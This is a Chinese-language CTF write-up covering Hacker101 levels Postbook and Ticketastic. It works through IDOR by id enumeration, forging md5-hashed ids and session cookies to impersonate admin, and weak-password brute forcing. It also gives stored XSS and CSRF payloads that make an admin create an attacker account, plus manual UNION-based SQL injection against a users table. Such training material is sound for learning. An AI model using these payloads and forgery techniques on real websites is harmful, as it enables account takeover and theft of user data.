> 原文链接: https://www.anquanke.com//post/id/180525 


# 玩转Hacker101 CTF（三）


                                阅读量   
                                **344645**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">10</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t012536c97c3969cb78.png)](https://p2.ssl.qhimg.com/t012536c97c3969cb78.png)



hi，大家好，我又来啦，接着[第一篇](https://www.anquanke.com/post/id/180186)和[第二篇](https://www.anquanke.com/post/id/180395)的进度，这次为大家带来Hacker101 CTF的第七、八、九题：

[![](https://p3.ssl.qhimg.com/t0177b534633521f7ba.gif)](https://p3.ssl.qhimg.com/t0177b534633521f7ba.gif)

废话不多说，上题！



## 第七题Postbook

这道题的难度定位为Easy，不是很难，但是Flag却有7个，涉及到多个漏洞，想要找全还是要费些功夫的。

打开主页：

[![](https://p2.ssl.qhimg.com/t01a93e6b69d28cf527.gif)](https://p2.ssl.qhimg.com/t01a93e6b69d28cf527.gif)

看来是个类似留言板的web应用，要留言需要登陆，先用test:test注册个用户试试,

[![](https://p4.ssl.qhimg.com/t011b9f16eca9e03304.gif)](https://p4.ssl.qhimg.com/t011b9f16eca9e03304.gif)

注册成功，回到登入界面,进入自己的主页：

[![](https://p2.ssl.qhimg.com/t01e002c39edb080ed4.gif)](https://p2.ssl.qhimg.com/t01e002c39edb080ed4.gif)

这个页面有点多，我们需要细心观察，留意一下几点：

1.url地址为:`http://xxxx/xxx/index.php?page=home.php`，这里可能有文件包含漏洞<br>
2.上方导航栏的几个功能链接，需要一一测试<br>
3.下方的`Create post`用于创建文本留言，注意`For my own eyes only`选项应该是控制创建的留言是否对所有人可见<br>
4.下方出现了admin用户<br>
5.最下方出现了user用户以及其公开的留言链接

我们先点击最下方的留言链接进去看看：

[![](https://p3.ssl.qhimg.com/t014fa784ab138c4933.gif)](https://p3.ssl.qhimg.com/t014fa784ab138c4933.gif)

注意这里的url：`http://xxxx/xxx/index.php?page=view.php?id=3`

依照经验，这种自写的留言板系统往往会存在越权访问，所以刷新这个页面，用burpsuite抓下包，

```
GET /xxx/index.php?page=view.php&amp;id=§2§ HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://xx.xx.xx.xx/xx/index.php?page=view.php&amp;id=3
Connection: close
Cookie: id=e4da3b7fbbce2345d7772b0674a318d5;
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

送到Intruder模块爆破一下id,将结果按Length排序：

[![](https://p1.ssl.qhimg.com/t01480c184c5d2f3534.gif)](https://p1.ssl.qhimg.com/t01480c184c5d2f3534.gif)

注意几个长度与众不同的Response包，在其中找到两个flag：

[![](https://p1.ssl.qhimg.com/t01c9691cea7df8a407.gif)](https://p1.ssl.qhimg.com/t01c9691cea7df8a407.gif)

[![](https://p1.ssl.qhimg.com/t019c1feb9907ea9752.gif)](https://p1.ssl.qhimg.com/t019c1feb9907ea9752.gif)

为什么一下有两个flag呢，第一个id链接到了admin用户的私有留言上，考察越权访问，

[![](https://p2.ssl.qhimg.com/t01132953526409a3bf.gif)](https://p2.ssl.qhimg.com/t01132953526409a3bf.gif)

另一个id比较大，应该是考察参数枚举吧！

这里我们既然可以访问到其他用户的留言，那么能不能编辑其他用户的留言呢？我们来尝试一下，首先点击导航栏的`Write a new post`，用当前用户创建一条留言：

[![](https://p5.ssl.qhimg.com/t01cdaf4616a8a40650.gif)](https://p5.ssl.qhimg.com/t01cdaf4616a8a40650.gif)

点击`Create Post`创建留言:

[![](https://p4.ssl.qhimg.com/t0100f4727eb50de00f.gif)](https://p4.ssl.qhimg.com/t0100f4727eb50de00f.gif)

点击`edit`链接，编辑:

[![](https://p5.ssl.qhimg.com/t018e014294536142c3.gif)](https://p5.ssl.qhimg.com/t018e014294536142c3.gif)

注意这里的url:`http://xxxx/xxx/index.php?page=edit.php?id=13`<br>
我们修改其中的id为刚刚爆破出flag的id，例如2,<br>`http://xxxx/xxx/index.php?page=edit.php?id=2`

[![](https://p0.ssl.qhimg.com/t01ce5884f3b3e83767.gif)](https://p0.ssl.qhimg.com/t01ce5884f3b3e83767.gif)

看，本来属于admin用户的私人留言，现在我们也可以编辑了！

点击`Save post`，看，系统为了“奖励我们编辑了他人的留言”，给了我们一个flag：

[![](https://p0.ssl.qhimg.com/t019f9ceae7697e6af3.gif)](https://p0.ssl.qhimg.com/t019f9ceae7697e6af3.gif)

接着试试能不能删除他人的留言呢？回到下面这个页面：

[![](https://p4.ssl.qhimg.com/t0100f4727eb50de00f.gif)](https://p4.ssl.qhimg.com/t0100f4727eb50de00f.gif)

点击`delete`链接,注意将包抓下来：

```
GET /xxxx/index.php?page=delete.php&amp;id=aab3238922bcc25a6f606eb525ffdc56 HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://xx.xx.xx.xx/xxx/index.php?page=view.php&amp;success=1&amp;id=14&amp;message=
Connection: close
Cookie: id=e4da3b7fbbce2345d7772b0674a318d5
Upgrade-Insecure-Requests: 1
```

注意与访问留言和编辑留言不同的是，删除链接url中的id是一个32的字符串，`aab3238922bcc25a6f606eb525ffdc56`,猜想这是一个hash值，把它放到md5解密网站跑了一下：

[![](https://p3.ssl.qhimg.com/t014757b1ea1ef7e70d.gif)](https://p3.ssl.qhimg.com/t014757b1ea1ef7e70d.gif)

是个数字，由于hash不能逆向解密，所以我猜想删除留言功能有着以下处理逻辑：

```
...
$result = $db-&gt;execute("select id from posts);
foreach($result['id'] as id)`{`
    if($_GET['id'] === id)`{`
        $db-&gt;execute("delete from posts where id=$_GET['id']);
    `}`
`}`
...
```

那么我们如果想要删除id=2的留言(这条留言不属于我们的当前用户),只需要修改刚刚抓下的包中的id值为`md5("2")`，即`c81e728d9d4c2f636f067f89cc14862c`,再次发包即可：

[![](https://p0.ssl.qhimg.com/t01276848ac6f63ed2d.gif)](https://p0.ssl.qhimg.com/t01276848ac6f63ed2d.gif)

看，又拿到一个flag！

至此，我们通过伪造信息编辑、修改、删除其他用户的post已经拿到了3个flag，想想还有什么，对！还有伪造他人进行留言，我们抓下创建post的包：

```
POST /xxx/index.php?page=create.php HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://xx.xx.xx.xx/xxx/index.php?page=create.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Connection: close
Cookie: id=e4da3b7fbbce2345d7772b0674a318d5
Upgrade-Insecure-Requests: 1

title=abc&amp;body=abc&amp;user_id=5

```

如果正常发包，会为`user_id=5`的用户添加一条留言，那么如果修改`user_id=1`呢，修改完毕后再次发包：

[![](https://p1.ssl.qhimg.com/t0153c33d74b3a66fa9.gif)](https://p1.ssl.qhimg.com/t0153c33d74b3a66fa9.gif)

又出现了一个flag。

继续，现在我们已经能够完全伪造另一个用户的所有动作了，那么我们能否通过某种方式伪造成其他用户登陆呢？一般来说服务器识别用户的方式是通过cookie，获取其他用户cookie的方式主要有两种：一是通过xss漏洞接受其他用户的cookie；二是破解cookie的构造方式伪造其他用户的cookie，例如：假如普通用户test的Cookie为：`Cookie :"user_name":"test"`,那么我们有理由相信，admin用户的Cookie应该为:`Cookie :"user_name":"admin"`,当然实际情况不会那么简单，往往还涉及到许多的密码学知识。

回到这道题上来，看一下当前用户的Cookie:

`Cookie: id=e4da3b7fbbce2345d7772b0674a318d5`<br>`e4da3b7fbbce2345d7772b0674a318d5`貌似又是一个hash值，解密一下：

[![](https://p0.ssl.qhimg.com/t012b2331989f352a55.gif)](https://p0.ssl.qhimg.com/t012b2331989f352a55.gif)

结果是5，猜测是代表用户id为5，那么如果想要伪造用户id为1的cookie，只需改为md5(“1”),即`c4ca4238a0b923820dcc509a6f75849b`,我们修改一下火狐的cookie：

[![](https://p1.ssl.qhimg.com/t01db3fa2d42d256a90.gif)](https://p1.ssl.qhimg.com/t01db3fa2d42d256a90.gif)

然后刷新一下页面，访问`http://xxxx/xxx/index.php`<br>
果然出现了flag。

好的，现在一共拿到了6个flag，第7个flag我想了很久，sql注入、XSS、源码泄露等套路都试过了，还是没有找到，无奈之下只好查看提示：

[![](https://p3.ssl.qhimg.com/t0100a148092415c565.gif)](https://p3.ssl.qhimg.com/t0100a148092415c565.gif)

WTF！这也行，算我输！抓下登录包，

[![](https://p3.ssl.qhimg.com/t01024b32e4d89a8c49.gif)](https://p3.ssl.qhimg.com/t01024b32e4d89a8c49.gif)

送到Intruder,用弱口令字典爆破，一会就出了结果:

[![](https://p5.ssl.qhimg.com/t01cddbf451b2738dfb.gif)](https://p5.ssl.qhimg.com/t01cddbf451b2738dfb.gif)

用user:password登入，拿到最后的flag

[![](https://p3.ssl.qhimg.com/t010d03e0566161c2de.gif)](https://p3.ssl.qhimg.com/t010d03e0566161c2de.gif)



## 第八题(Ticketastic: Demo Instance)&amp;第九题(Ticketastic: Live Instance)

第八题和第九题其实是一题，第八题没有flag，是第九题的web应用的测试版本，它的存在是为了给第九题以提示，第九题才是真正的生产环境。我们先打开第八题来看一下：

[![](https://p1.ssl.qhimg.com/t011c4c1d4877229e16.gif)](https://p1.ssl.qhimg.com/t011c4c1d4877229e16.gif)

从功能和内容上判断这是一个信息反馈系统，任何人都可以提交Ticket,但只有管理员才能登陆查看所有的Ticket，并且告知我们admin用户的密码是admin，我们提交一个Ticket试试：

[![](https://p2.ssl.qhimg.com/t010b203d5cf9fc701a.gif)](https://p2.ssl.qhimg.com/t010b203d5cf9fc701a.gif)

[![](https://p0.ssl.qhimg.com/t011f48a55a00a7a80c.gif)](https://p0.ssl.qhimg.com/t011f48a55a00a7a80c.gif)

回到主页，用给我们的admin账号登陆：

[![](https://p1.ssl.qhimg.com/t01217b33d9d00f04bc.gif)](https://p1.ssl.qhimg.com/t01217b33d9d00f04bc.gif)

[![](https://p1.ssl.qhimg.com/t019e0be0c03161b2bb.gif)](https://p1.ssl.qhimg.com/t019e0be0c03161b2bb.gif)

可以看到我们刚刚提交的tikcet已经出现这里了，同时注意到这里还有创建用户的链接。

点开test是我们提交的ticket内容：

[![](https://p4.ssl.qhimg.com/t0184d609f475be0a67.gif)](https://p4.ssl.qhimg.com/t0184d609f475be0a67.gif)

在这个页面我们有两点内容值得我们注意：

1.url：`http://xxxx/xxx/ticket?id=2`,我们试试访问`http://xxxx/xxx/ticket?id=2-1`,显示：

[![](https://p4.ssl.qhimg.com/t01b45b09c40e6b3334.gif)](https://p4.ssl.qhimg.com/t01b45b09c40e6b3334.gif)

这与访问`http://xxxx/xxx/ticket?id=1`的返回页面结果是一样的，说明这里可能有sql注入。

2.很显然，我们提交的内容被保存在了数据库里，并且在admin用户的页面呈现了出来，如果我们将ticket的内容换成XSS或者CSRF的payload，会不会让admin用户中招呢？我们来试一试，回到主页，提交一个ticket，title和body都填`&lt;img src=x onerror=alert(1)&gt;`,登入admin用户，刚登入就弹出了框框：

[![](https://p2.ssl.qhimg.com/t010f3a3bfb588a6eaa.gif)](https://p2.ssl.qhimg.com/t010f3a3bfb588a6eaa.gif)

Good！既然这里可以XSS，我们可以怎样利用呢？一种思路是架个服务器接收admin用户的cookie（如果抓个包，可以看到cookie并没有设置httponly），然而这里的靶场不能外联，所以我放弃了这条思路，还有其他办法吗？CSRF有什么可以利用的点吗？注意到上面的`Create a new user`链接，我们能否结合这个功能来创建我们的用户呢？我们首先用admin用户的面板创建用户test:test，抓下包：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t015fb30c388252e8a6.gif)

```
GET /xxx/newUser?username=test&amp;password=test&amp;password2=test HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://xx.xx.xx.xx/xxx/newUser
Connection: close
Cookie: session_level7a=eyJ1c2VyIjoiYWRtaW4ifQ.D-pwWw.xIfxmh00wlGwcQUBFWC92kk6gTM
Upgrade-Insecure-Requests: 1
```

记下url请求：`http://xxxx/xxx/newUser?username=root&amp;password=123456&amp;password2=123456`,回到主页再次提交一个ticket，这次title和body都填:<br>`&lt;img src=newUser?username=root&amp;password=123456&amp;password2=123456&gt;`

[![](https://p5.ssl.qhimg.com/t0183ce96989a051c01.gif)](https://p5.ssl.qhimg.com/t0183ce96989a051c01.gif)

然后再次登入admin用户：

[![](https://p5.ssl.qhimg.com/t01fe65536266022801.gif)](https://p5.ssl.qhimg.com/t01fe65536266022801.gif)

查看最下方那张无法正常显示的图片：

[![](https://p0.ssl.qhimg.com/t010c1332973e7fff04.gif)](https://p0.ssl.qhimg.com/t010c1332973e7fff04.gif)

payload正常，应该奏效了，回到登入页面，用root:123456成功登入！

好吧，测试版本系统的漏洞分析的差不多了，来研究一下上线版本吧！打开第九题：

[![](https://p4.ssl.qhimg.com/t01cd8b66dc4e536715.gif)](https://p4.ssl.qhimg.com/t01cd8b66dc4e536715.gif)

界面和功能几乎是一样的，依然可以提交ticket和登入查看ticket，不过这次admin的密码改了，我们无法登入触发CSRF了，考虑了一下这边可能有机器人访问ticket页面，所以依旧采用刚刚的payload，提交一个ticket，title和body依然填<br>`&lt;img src='newUser?username=root&amp;password=123456&amp;password2=123456'&gt;`,提交，然后回到登入页面，用root:123456登入，满怀希望看见Flag，然而：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0142e1c6a62b20e58d.gif)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01dc0caf45a0ef1e6e.jpg)

没关系，换个要点击的payload，也许这个机器人会主动点击呢？

`&lt;a href="http://localhost/newUser?username=root&amp;password=123456&amp;password2=123456"&gt;haha&lt;/a&gt;`<br>
尝试登陆:

[![](https://p5.ssl.qhimg.com/t01c551e5d97467bc2b.gif)](https://p5.ssl.qhimg.com/t01c551e5d97467bc2b.gif)

成功！真是个奇怪的机器人！点击`Flag Won't Work`，拿到第一个Flag，注意下面的才是真Flag！

[![](https://p3.ssl.qhimg.com/t014cb44b162e770c1c.gif)](https://p3.ssl.qhimg.com/t014cb44b162e770c1c.gif)

接下来，别忘了这里还有个sql注入漏洞，不过很奇怪，sqlmap居然跑不出来（如果有那位童鞋跑出来了可以和我说下)，所以只好手动注入，下面是过程：

```
http://xx.xx.xx.xx/xxx/ticket?id=1 order by 3 -- //判断为3列
http://xx.xx.xx.xx/xxx/ticker?id=10 union select id,username,password from users where username='admin' -- //表名和列名都是猜的｡ﾟ(ﾟ´ω`ﾟ)ﾟ｡很奇怪information_schema中居然查不到表名
```

结果显示，admin用户的密码就是第二个Flag：

[![](https://p5.ssl.qhimg.com/t015b209e144ec669c7.gif)](https://p5.ssl.qhimg.com/t015b209e144ec669c7.gif)
